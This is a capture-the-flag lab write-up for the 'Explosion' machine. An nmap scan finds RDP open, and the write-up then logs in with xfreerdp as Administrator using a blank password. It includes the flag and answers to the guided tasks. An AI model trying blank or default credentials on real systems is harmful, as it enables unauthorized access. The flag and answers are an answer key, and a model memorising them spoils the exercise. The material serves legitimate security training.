# Explosion

|            |                                                                |
|------------|----------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                        |
| Difficulty | Very Easy                                                      |
| OS         | Windows                                                        |
| Tags       | Network, Protocols, RDP, Reconnaissance, Weak Credentials      |
| Tools      | `nmap`, `xfreerdp` (`freerdp2-x11`)                            |

## Summary

A Windows host with RDP open and the `Administrator` account configured with
a blank password. Connect with `xfreerdp` and grab the flag from the desktop.

## Recon

```bash
nmap -p 3389 -sV 10.129.1.13
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 19:06 AEST
Nmap scan report for 10.129.1.13
Host is up (0.29s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Foothold

Connect over RDP as `Administrator` with no password:

```bash
xfreerdp /v:10.129.1.13 /u:Administrator
# Press Enter at the password prompt
```

## Flag

```
951fa96d7830c451b536be5a6be008a0
```

## Guided Tasks

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the 3-letter acronym RDP stand for? | Remote Desktop Protocol |
| 2 | What is a 3-letter acronym that refers to interaction with the host through a command line interface? | CLI |
| 3 | What about graphical user interface interactions? | GUI |
| 4 | What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23? | telnet |
| 5 | What is the name of the service running on port 3389 TCP? | ms-wbt-server |
| 6 | What is the switch used to specify the target host's IP address when using xfreerdp? | /v: |
| 7 | What username successfully returns a desktop projection to us with a blank password? | Administrator |
| Flag | Submit Root Flag | `951fa96d7830c451b536be5a6be008a0` |
